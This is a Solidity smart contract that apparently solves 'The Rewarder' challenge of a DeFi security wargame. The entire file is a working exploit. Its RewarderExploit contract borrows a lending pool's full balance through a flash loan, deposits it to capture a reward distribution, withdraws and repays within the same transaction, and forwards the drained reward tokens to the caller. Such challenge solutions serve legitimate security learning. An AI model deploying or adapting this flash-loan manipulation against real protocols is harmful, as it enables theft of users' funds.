pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";

//@dev Interface of the pool to be drained
interface RewarderPool {
	function deposit(uint256 depositAmount) external;

	function withdraw(uint256 withdrawAmount) external;

}

//@dev the pool lending the flash loans
interface LenderPool {
	function flashLoan(uint256 amount) external;
}	

/*
   @title The Rewarder challenge solver
   @dev FlashLoanerPool.flashLoan allows for an arbitrary function, without 
   checking its return. We can approve our transfer of a loan.
 */
contract RewarderExploit {

	IERC20 liquidityToken;
	IERC20 rewardToken;	
	LenderPool lendPool;
	RewarderPool rewardPool;

	//@dev Deposit loan to get reward, withdraw total and repay what was lent
	function receiveFlashLoan(uint256 amount) external{
		rewardPool.deposit(amount);
		rewardPool.withdraw(amount);
		liquidityToken.transfer(address(lendPool), amount);
	}
		
	//@param _lendPool The lending pool
	//@param _rewardPool The pool to be drained
	//@param _liquidityToken The lent token
	//@param _rewardToken The reward token to be claimed
	/*@dev  We take a loan for the pool total, deposit it to get all the rewards 
	  and then withdraw it to repay the loan. 
	 */ 
	function attack(
		LenderPool _lendPool,
		RewarderPool _rewardPool,
		IERC20 _liquidityToken,
		IERC20 _rewardToken
	) public {

		lendPool= _lendPool;
		rewardPool = _rewardPool;
		liquidityToken = _liquidityToken;
		rewardToken = _rewardToken;

		uint256 lendPoolBalance = liquidityToken.balanceOf(address(lendPool));
		liquidityToken.approve(address(rewardPool), lendPoolBalance);
		lendPool.flashLoan(lendPoolBalance);

		//check if the reward transfer succeeded
		require(rewardToken.balanceOf(address(this)) > 0, "No rewards taken");
		bool isRewarded =
			rewardToken.transfer(
				msg.sender,
		rewardToken.balanceOf(address(this))
		);
		require(isRewarded, "reward transfer failed");
	       
	}
	
	

}
